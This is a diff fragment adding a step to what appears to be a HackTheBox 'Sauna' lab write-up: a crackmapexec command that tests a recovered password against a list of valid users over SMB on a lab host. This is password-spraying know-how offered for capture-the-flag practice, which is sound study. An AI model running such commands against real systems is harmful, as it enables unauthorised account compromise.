@@ -63,3 +63,8 @@ Thestrokes23
 ```
 
 
+If we want to see like this password is valid for any user than we can do it in this way
+```
+crackmapexec smb 10.10.10.175 -u ~root/HackTheBox/Sauna/valid_user.txt -p Washington10URedmond10U
+```
+
